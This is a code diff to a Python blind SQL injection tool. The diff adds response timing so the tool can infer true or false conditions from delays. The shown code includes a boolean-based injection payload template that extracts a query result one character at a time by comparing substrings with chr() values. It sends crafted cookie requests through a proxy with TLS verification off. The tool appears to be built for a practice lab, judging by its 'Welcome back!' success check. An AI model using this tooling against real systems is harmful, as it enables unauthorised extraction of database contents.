@@ -3,6 +3,7 @@ import logging
 import urllib3
 import string
 import concurrent.futures
+import time
 
 import requests
 
@@ -25,11 +26,12 @@ class SQLi:
         return (
             f"zzzz' or (select substring(({inner_query}), {index}, 1)=chr({char}))-- "
         )
-    def is_true(self, resp):
+    def is_true(self, resp, duration):
         """override in subclass"""
         if "Welcome back!" in resp.text:
             return True
         return False
+    
     def format_request(self, url, outer_query):
         """override in subclass"""
         cookies = {
@@ -45,11 +47,14 @@ class SQLi:
         for i in range(1, self.max_length):
             outer_query = self.format_length_query(inner_query, i)
             prepped = self.format_request(url, outer_query)
+            start = time.time()
             if no_proxy:
                 resp = sess.send(prepped)
             else:
                 resp = sess.send(prepped, proxies=utils.PROXIES, verify=False)
-            if self.is_true(resp):
+            end = time.time()
+            duration = end - start
+            if self.is_true(resp, duration):
                 response_length = i
                 log.info(f"Length of query response is {response_length}")
                 return i
